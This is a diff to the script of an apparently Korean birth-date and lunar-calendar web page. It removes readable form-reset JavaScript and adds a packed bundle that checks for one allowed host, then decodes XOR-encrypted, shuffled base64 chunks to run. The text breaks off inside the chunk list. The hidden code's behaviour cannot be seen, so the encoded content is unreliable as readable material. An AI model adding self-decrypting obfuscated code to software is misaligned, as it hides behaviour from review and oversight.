-                    leapEl.disabled = !isLunar;
-                    if (!isLunar) leapEl.checked = false;
-                }
-            }
-            radios.forEach(r => r.addEventListener('change', sync));
-            sync();
-        })();
-
-        // 페이지 최초 로드 시(새로고침/자동완성 복원 포함) 생년월일시를 빈 값으로 초기화
-        window.addEventListener('DOMContentLoaded', () => {
-            const yearEl = document.getElementById('year');
-            const monthEl = document.getElementById('month');
-            const dayEl = document.getElementById('day');
-            const hourEl = document.getElementById('hour');
-
-            if (yearEl) yearEl.value = '';
-            if (monthEl) monthEl.value = '';
-            if (dayEl) dayEl.value = '';
-            if (hourEl) hourEl.value = '';
-
-            // 윤달 체크 초기화
-            const leapEl = document.getElementById('leapMonth');
-            if (leapEl) leapEl.checked = false;
-
-            // 결과 영역은 숨김 상태로 시작
-            const resultEl = document.getElementById('result');
-            if (resultEl) resultEl.classList.remove('active');
-        });
-
-    </script>
+<script>/* Packed bundle - strong obfuscation (chunks + XOR + shuffled order) */
+(() => {
+  'use strict';
+
+  // ---- Domain check (edit this) ----
+  const ALLOWED_HOSTS = ['sh-master.github.io'];
+  // If you set ALLOWED_HOSTS to real hosts, the app will run ONLY on those hosts.
+  // Example: ["username.github.io", "www.example.com", "example.com"]
+  const host = location.hostname;
+  const isAllowed = ALLOWED_HOSTS.includes(host);
+  if (!isAllowed) {
+    document.documentElement.innerHTML = '';
+    document.body.innerHTML = '<div style="font-family:system-ui;padding:24px">Nope</div>';
+    return;
+  }
+
+  // ---- Decode / decrypt / run ----
+  const key = Uint8Array.from(atob('031jnUXJSGV2h2hESJrBKQ=='), c => c.charCodeAt(0));
+  const order = [16, 53, 32, 0, 8, 46, 37, 51, 15, 44, 26, 61, 24, 2, 28, 45, 20, 33, 12, 23, 49, 34, 18, 14, 56, 21, 17, 42, 31, 55, 35, 30, 48, 1, 13, 7, 60, 58, 27, 25, 43, 6, 19, 5, 59, 47, 57, 36, 11, 38, 50, 52, 40, 3, 39, 10, 41, 9, 22, 54, 29, 4];
+  const parts = ['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', 